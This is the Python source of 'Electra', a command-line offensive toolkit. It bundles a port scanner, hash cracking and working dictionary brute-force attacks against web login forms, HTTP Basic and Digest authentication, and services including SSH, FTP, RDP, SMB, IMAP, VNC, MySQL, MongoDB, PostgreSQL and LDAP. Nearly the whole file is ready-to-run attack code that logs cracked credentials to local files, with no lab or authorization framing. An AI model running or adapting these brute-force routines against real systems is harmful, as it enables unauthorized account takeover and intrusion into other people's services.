#!/usr/bin/env python3
import pymongo.errors
import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3
#import telnetlib (Deprecated in python 3.13)
import requests.auth
from smbprotocol.connection import Connection
from smbprotocol.session import Session
import vncdotool.api
from hashid import HashID

BANNER = """
███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██ ██╔══██╗
█████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.1

Electra - The master plan plotter.
"""

class BannerGroup(click.Group):
    def get_help(self, ctx):
        click.echo(BANNER)
        return super().get_help(ctx)
    
    def format_commands(self, ctx, formatter):
        commands = [
            ("cdir", "Create a new directory in a specified path."),
            ("sscan", "Perform a system scan."),
            ("nscan", "Perform a network scan."),
            ("webpass", "Web Dictionary Password Brute Force Attack."),
            ("webuser", "Web Dictionary Username Brute Force Attack."),
            ("hashgen", "Generate hash of a specific password."),
            ("hashcrk", "Crack a hash or a list of hashes."),
            ("srvatk", "Services Dictionary Password Brute Force attack."),
            ("webatk", "Web (Basic & Digest) Username/Password Brute Force attack.")
        ]
        with formatter.section("Commands"):
            for cmd, desc in commands:
                formatter.write_text(f"{cmd:<10} {desc}")
        #return super().format_commands(ctx, formatter)

#HELP COMMAND
@click.group(cls=BannerGroup)
@click.option("-h", "--help", is_flag=True, expose_value=False, is_eager=True, callback=lambda ctx, param, value: click.echo(ctx.get_help()) if value else None, help="Show this help message and exit.")
def cli():
    click.echo(BANNER)

#CDIR COMMAND
@cli.command()
@click.option("-n", "--name", default="Directory", prompt="Enter dir name", help="Name of the directory to create. Default name is 'Directory'.")
@click.option("-p", "--path", default=None, help="Path where the directory should be created. Default is current working directory.")
def cdir(name, path):
    #Check whether OS is Linux
    if os.name != "posix":
        click.echo(click.style("[~] This function is only supported on Linux systems.", fg="magenta"))
        return
    
    #Set default path
    if not path:
        path = os.getcwd()
        click.echo(click.style(f"[~] No path specified. Using current directory: {path}", fg="magenta"))
    
    #Construct the full directory path
    full_path = os.path.join(path, name)

    try:
        os.makedirs(full_path, exist_ok=True)
        click.echo(click.style(f"[!] Dir: '{name}' created successfully at {full_path}", fg="green"))
    except PermissionError:
        click.echo(click.style("[!] Error: Permission denied. Try running with elevated privileges.", fg="red"))
    except FileExistsError:
        click.echo(click.style("[!] Error: Dir already exists.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#SSCAN COMMAND
@cli.command()
@click.option("-h", "--hostname", required=True, prompt="Hostname", help="Hostname of the system to scan.")
def sscan(hostname):
    click.echo(click.style(f"[*] Starting system scan for host: {hostname}", fg="blue"))
    try:
        #Resolve IP of the host
        ip = socket.gethostbyname(hostname)
        click.echo(click.style(f"[!] Resolved IP address: {ip}", fg="green"))
        #Perform ping test
        response = os.system(f"ping -c 4 {ip}")
        if response == 0:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is reachable.", fg="green"))
        else:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is not reachable.", fg="red"))
            return
        
        #OS and system info
        click.echo(click.style("\n[*] Gathering OS and System info ...", fg="blue"))
        os_name = platform.system()
        os_version = platform.version()
        architecture = platform.machine()
        click.echo(click.style(f"[!] OS: {os_name}", fg="green"))
        click.echo(click.style(f"[!] OS Version: {os_version}", fg="green"))
        click.echo(click.style(f"[!] Architecture: {architecture}", fg="green"))
        click.echo(click.style("[--------------------------------]", fg="yellow"))
        cpu_cores = psutil.cpu_count(logical=False)
        total_mem = psutil.virtual_memory().total // (1024 ** 2)
        click.echo(click.style(f"[!] CPU Cores: {cpu_cores}", fg="green"))
        click.echo(click.style(f"[!] Total Mem: {total_mem} MBs", fg="green"))
        click.echo(click.style("[--------------------------------]", fg="yellow"))
        #Network info
        for interfaces, addresses in psutil.net_if_addrs().items():
            click.echo(click.style(f"[!] Network Interface: {interfaces}", fg="green"))
            click.echo(click.style(""))
            for address in addresses:
                if address.family == socket.AF_INET:
                    click.echo(click.style(f"[!] IPv4: {address.address}", fg="green"))
                elif address.family == socket.AF_INET6:
                    click.echo(click.style(f"[!] IPv6: {address.address}", fg="green"))
                elif address.family == psutil.AF_LINK:
                    click.echo(click.style(f"[!] MAC: {address.address}", fg="green"))
            click.echo(click.style(""))

        click.echo(click.style("[--------------------------------]", fg="yellow"))
        #AD info (if os == windows)
        if os_name == "Windows":
            try:
                ad_domain = subprocess.check_output("net config workstation", shell=True).decode()
                if "Workstation Domain" in ad_domain:
                    click.echo(click.style("[!] AD Domain detected.", fg="green"))
                else:
                    click.echo(click.style("[!] No AD Domain detected.", fg="red"))
            except Exception as e:
                click.echo(click.style("[!] Could not retrieve AD Domain info.", fg="red"))
        else:
            click.echo(click.style("[!] Host OS is not Windows. No AD Domain detected.", fg="red"))
    
    except socket.gaierror:
        click.echo(click.style(f"[!] Error: Hostname: {hostname} could not be resolved.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#NSCAN COMMAND
@cli.command()
@click.option("-h", "--host", required=True, help="Target IP, Socket or hostname for network scan.")
@click.option("-p", "--port", default="1-1024", help="Port (range) to scan. Default 1-1024.")
@click.option("-t", "--tcp", is_flag=True, help="Perform TCP scan.")
@click.option("-u", "--udp", is_flag=True, help="Perform UDP scan.")
@click.option("-s", "--stealth", is_flag=True, help="Perform a stealth scan. Requires root privileges.")
@click.option("-l", "--loud", is_flag=True, help="Perform a loud scan. (No delays between scans)")
def nscan(host, port, tcp, udp, stealth, loud):
    first_port, last_port = map(int, port.split("-"))
    scan_type = "Stealth" if stealth else "Loud"
    click.echo(click.style(f"[*] Starting {scan_type} network scan on {host} ...", fg="blue"))
    for port in range(first_port, last_port + 1):
        if tcp:
            try:
                socketer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socketer.settimeout(3)
                result = socketer.connect_ex((host, port))
                if result == 0:
                    click.echo(click.style(f"[!] Open TCP port: {port}", fg="green"))
                socketer.close()
            except Exception as e:
                click.echo(click.style(f"[!] TCP scan error on port {port}. {e}", fg="red"))
        if udp:
            try:
                socketer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                socketer.settimeout(3)
                socketer.sendto(b'', (host, port))
                socketer.recvfrom(1024)
                click.echo(click.style(f"[!] Open UDP port: {port}", fg="green"))
            except socket.timeout:
                click.echo(click.style(f"[!] Timeout! Port: {port} may be filtered.", fg="yellow"))
            except Exception as e:
                click.echo(click.style(f"[!] UDP scan error on port {port}. {e}", fg="red"))
            finally:
                socketer.close()
        if not loud:
            time.sleep(0.2) #Delay to reduce loudness
    click.echo(click.style(f"[*] Network scan on {host} completed.", fg="blue"))

#WEBPASS COMMAND
@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-U", "--username", prompt="Username", help="Username for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the password wordlist.")
def webpass(url, username, wordlist):
    click.echo(click.style(f"[*] Starting password wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found password: {password}", fg="green"))
                    #Save password to a file
                    with open("Electra-Found-Passwords.txt", "a") as found_passwords:
                        found_passwords.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with password: '{password}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Password Wordlist BF attack completed. No valid passwords found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

#WEBUSER COMMAND
@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-p", "--password", prompt="Password", help="Password for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the username wordlist.")
def webuser(url, password, wordlist):
    click.echo(click.style(f"[*] Starting username wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for username in file:
                username = username.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found username: {username}", fg="green"))
                    #Save username to a file
                    with open("Electra-Found-Usernames.txt", "a") as found_usernames:
                        found_usernames.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with username: '{username}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Username Wordlist BF attack completed. No valid usernames found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

#HASHGEN COMMAND
@cli.command()
@click.option("-f", "--function", type=click.Choice(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", "sha3_224", "sha3_256", "sha3_384", "sha3_512" "bcrypt"], case_sensitive=False), required=True, help="Hash function (MD5, SHA1, BCrypt, etc).")
@click.option("-p", "--password", required=True, help="Password to hash.")
def hashgen(function, password):
    #Generate hash based on selected func
    click.echo(click.style(f"[*] Generating the hash of: {password} using: {function}.", fg="blue"))
    if function == "md5":
        hashed_pass = hashlib.md5(password.encode()).hexdigest()
    elif function == "sha1":
        hashed_pass = hashlib.sha1(password.encode()).hexdigest()
    elif function == "sha224":
        hashed_pass = hashlib.sha224(password.encode()).hexdigest()
    elif function == "sha256":
        hashed_pass = hashlib.sha256(password.encode()).hexdigest()
    elif function == "sha384":
        hashed_pass = hashlib.sha384(password.encode()).hexdigest()
    elif function == "sha512":
        hashed_pass = hashlib.sha512(password.encode()).hexdigest()
    elif function == "sha3_224":
        hashed_pass = hashlib.sha3_224(password.encode()).hexdigest()
    elif function == "sha3_256":
        hashed_pass = hashlib.sha3_256(password.encode()).hexdigest()
    elif function == "sha3_384":
        hashed_pass = hashlib.sha3_384(password.encode()).hexdigest()
    elif function == "sha3_512":
        hashed_pass = hashlib.sha3_512(password.encode()).hexdigest()
    elif function == "bcrypt":
        salt = bcrypt.gensalt()
        hashed_pass = bcrypt.hashpw(password.encode(), salt).decode()
    
    click.echo(click.style(f"[!] {function.upper()} hash of '{password}' is {hashed_pass}", fg="green"))
    #Save hash to a file
    with open("Electra-Hashed-Passwords.txt", "a") as hashed_passwords:
        hashed_passwords.write(f"{function.upper()} hash: {hashed_pass}, Password: {password}\n")
    click.echo(click.style("[!] Hash successfully saved to Electra-Hashed-Passwords.txt", fg="green"))

#HASHCRK COMMAND
@cli.command()
@click.option("-h", "--hash", help="Hash to crack.")
@click.option("-l", "--hashlist", type=click.Path(exists=True), help="Path to the list of hashes.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to the password wordlist.")
@click.option("-t", "--type", type=click.Choice(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", "sha3_224", "sha3_256", "sha3_384", "sha3_512" "bcrypt"], case_sensitive=False), help="Hash type. (e.g. MD5, SHA1 etc)")
def hashcrk(hash, hashlist, wordlist, type):
    hashid = HashID()
    hash_targets = []
    if hash:
        hash_targets.append((hash, type or hashid.identifyHash(hash)))
    elif hashlist:
        with open(hashlist, "r") as file:
            for line in file:
                hash_value = line.strip()
                hash_type = type or hashid.identifyHash(hash_value)
                hash_targets.append((hash_value, hash_type))
            #hash_targets = [(line.strip(), type or hashid.identifyHash(line.strip())) for line in file]
    
    with open(wordlist, "r") as file:
        for password in file:
            password = password.strip()
            for h, htype in hash_targets:
                computed_hash = hashlib.new(htype, password.encode()).hexdigest()
                if computed_hash == h:
                    click.echo(click.style(f"[!] Hash: {h} cracked! Password: {password}", fg="green"))
                    break

#SERVATK COMMAND
@cli.command()
@click.option("-s", "--service", type=click.Choice(["ssh", "ftp", "rdp", "smb", "pop3", "imap", "telnet", "vnc", "mysql", "mongodb", "postgresql", "ldap"], case_sensitive=False), required=True, help="Specify the service to attack (SSH, FTP, etc).")
@click.option("-h", "--host", required=True, help="IP, Socket or Hostname of the target.")
@click.option("-u", "--username", required=True, help="Username for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to password wordlist.")
#@click.option("-id", "--guid", default=None, help="Unique session identifier. (For cases where two services are running. e.g. smb)")
def srvatk(service, host, username, wordlist):
    click.echo(click.style(f"[*] Starting {service.upper()} BF attack on {host} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                if service == "ssh":
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        client.connect(host, username=username, password=password, timeout=5)
                        click.echo(click.style(f"[!] Found SSH password of user: {username} is {password}", fg="green"))
                        client.close()
                        #Save ssh password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        return
                    except paramiko.AuthenticationException:
                        click.echo(click.style(f"[!] SSH authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] SSH connection error: {e}", fg="red"))
                elif service == "ftp":
                    try:
                        ftp = ftplib.FTP(host)
                        ftp.login(user=username, passwd=password)
                        click.echo(click.style(f"[!] Found FTP password of user: {username} is {password}", fg="green"))
                        ftp.quit()
                        #Save ftp password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        return
                    except ftplib.error_perm:
                        click.echo(click.style(f"[!] FTP authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] FTP connection error: {e}", fg="red"))
                elif service == "rdp":
                    try:
                        connection = subprocess.run(
                            ["xfreerdp", f"/v:{host}", f"/u:{username}", f"/p:{password}", "/cert-ignore", "/auth-only"], capture_output=True, text=True
                        )
                        #if "Authentication only, exit status 0" in connection.stderr:

                        if connection.returncode == 0:
                            click.echo(click.style(f"[!] Found RDP password of user: {username} is {password}", fg="green"))
                            #Save rdp password to a file
                            with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                                service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                                click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                            return
                        else:
                            click.echo(click.style(f"[!] RDP authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] RDP connection error: {e}", fg="red"))
                elif service == "smb":
                    try:
                        smb_connection = Connection(guid="some-unique-id", username=username, password=password, server=host, port=445) #Thelei tropopoiisi se periptosi pou xrisimopoiithei to option -id
                        smb_connection.connect()
                        smb_session = Session(smb_connection)
                        smb_session.connect()
                        click.echo(click.style(f"[!] Found SMB password of user: {username} is {password}", fg="green"))
                        #Save smb password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Host: {host}, Username: {username}, Password: {password}\n")
                            click.echo(click.style(f"[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        smb_session.disconnect()
                        smb_connection.disconnect()
                        return
                    except Exception as e:
                        click.echo(click.style(f"[!] SMB authentication attempt with {password} failed.", fg="red"))
                elif service == "pop3":
                    try:
                        pop3_connection = poplib.POP3(host)
                        pop3_connection.user(username)
                        pop3_connection.pass_(password)
                        click.echo(click.style(f"[!] Found POP3 password for user: {username} is {password}", fg="green"))
                        pop3_connection.quit()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except poplib.error_proto:
                        click.echo(click.style(f"[!] POP3 authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] POP3 connection error: {e}", fg="red"))
                elif service == "imap":
                    try:
                        imap_connection = imaplib.IMAP4(host)
                        imap_connection.login(username, password)
                        click.echo(click.style(f"[!] Found IMAP password for user: {username} is {password}", fg="green"))
                        imap_connection.logout()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except imaplib.IMAP4.error:
                        click.echo(click.style(f"[!] IMAP authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] IMAP connection error: {e}", fg="red"))
                elif service == "vnc":
                    try:
                        vnc_connection = vncdotool.api.connect(host)
                        vnc_connection.password(password)
                        click.echo(click.style(f"[!] Found VNC password for user: {username} is {password}", fg="green"))
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        vnc_connection.disconnect()
                        return
                    except vncdotool.api.VNCDoException:
                        click.echo(click.style(f"[!] VNC authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] VNC connection error: {e}", fg="red"))
                elif service == "mysql":
                    try:
                        mysql_connection = pymysql.connect(host=host, user=username, password=password)
                        click.echo(click.style(f"[!] Found MySQL password for user: {username} is {password}", fg="green"))
                        mysql_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except pymysql.MySQLError:
                        click.echo(click.style(f"[!] MySQL authentication attempt with {password} failed.", fg="red"))
                elif service == "mongodb":
                    try:
                        mongodb_connection = pymongo.MongoClient(f"mongodb://{username}:{password}@{host}")
                        mongodb_connection.admin.command("ping") #Test connection
                        click.echo(click.style(f"[!] Found MongoDB password for user: {username} is {password}", fg="green"))
                        mongodb_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except pymongo.errors.OperationFailure:
                        click.echo(click.style(f"[!] MongoDB authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] MongoDB connection error: {e}", fg="red"))
                elif service == "postgresql":
                    try:
                        postgresql_connection = psycopg2.connect(host=host, user=username, password=password)
                        click.echo(click.style(f"[!] Found PostgreSQL password for user: {username} is {password}", fg="green"))
                        postgresql_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except psycopg2.OperationalError:
                        click.echo(click.style(f"[!] PostgreSQL authentication attempt with {password} failed.", fg="red"))
                elif service == "ldap":
                    ldap_server = ldap3.Server(host, get_info=ldap3.NONE)
                    ldap_connection = ldap3.Connection(ldap_server, user=username, password=password)
                    if ldap_connection.bind():
                        click.echo(click.style(f"[!] Found LDAP password for user: {username} is {password}", fg="green"))
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        ldap_connection.unbind()
                        return
                    else:
                        click.echo(click.style(f"[!] LDAP authentication attempt with {password} failed.", fg="red"))
                    ldap_connection.unbind()
                """Commented due to deprecation
                elif service == "telnet":
                    try:
                        telnet_connection = telnetlib.Telnet(host, timeout=5)
                        telnet_connection.read_until(b"login: ")
                        telnet_connection.write(username.encode("ascii") + b"\n")
                        telnet_connection.read_until(b"Password: ")
                        telnet_connection.write(password.encode("ascii") + b"\n")
                        #Check login
                        response = telnet_connection.read_some().decode("ascii")
                        if "incorrect" not in response.lower():
                            click.echo(click.style(f"[!] Found Telnet password for user: {username} is {password}", fg="green"))
                            with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                                service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            telnet_connection.close()
                            return
                        else:
                            click.echo(click.style(f"[!] Telnet authentication attempt with {password} failed.", fg="red"))
                        telnet_connection.close()
                    except EOFError:
                        click.echo(click.style(f"[!] Telnet connection closed unexpectedly.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] Telnet connection error: {e}", fg="red"))
                """

        click.echo(click.style(f"[!] {service.upper()} BF attack completed. No valid passwords found.", fg="magenta"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#WEBATK COMMAND
@cli.command()
@click.option("-u", "--url", required=True, prompt="Target URL", help="URL of the target authentication page.")
@click.option("-U", "--username", required=False, help="Use a specific username for authentication. If ommited, a username wordlist must be provided.")
@click.option("-uw", "--user-wordlist", type=click.Path(exists=True), help="Path to username wordlist. (For Brute-Forcing usernames)")
@click.option("-pw", "--pass-wordlist", type=click.Path(exists=True), help="Path to password wordlist.")
@click.option("-m", "--auth-method", type=click.Choice(["basic", "digest"], case_sensitive=False), required=True, help="Authentication method (basic or digest).")
def webatk(url, username, user_wordlist, pass_wordlist, auth_method):
    click.echo(click.style(f"[*] Starting {auth_method.upper()} authentication BF attack on: {url}", fg="blue"))
    try:
        usernames = [username] if username else open(user_wordlist).read().splitlines()
        passwords = open(pass_wordlist).read().splitlines()

        for user in usernames:
            for password in passwords:
                auth = requests.auth.HTTPBasicAuth(user, password) if auth_method == "basic" else requests.auth.HTTPDigestAuth(user, password)
                response = requests.get(url, auth=auth)

                if response.status_code == 200:
                    click.echo(click.style(f"[!] Credentials found! Username: {user} Password: {password}", fg="green"))
                    with open("Electra-Found-Web-Passwords.txt", "a") as found_creds:
                        found_creds.write(f"URL: {url}, Username: {user}, Password: {password}, Auth Method: {auth_method.upper()}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Failed authentication attempt with username: {user} and password: {password}", fg="red"))
        click.echo(click.style(f"[!] {auth_method.upper()} HTTP/HTTPS BF attack completed. No valid credentials found.", fg="magenta"))
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Request Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

if __name__ == "__main__":
    cli()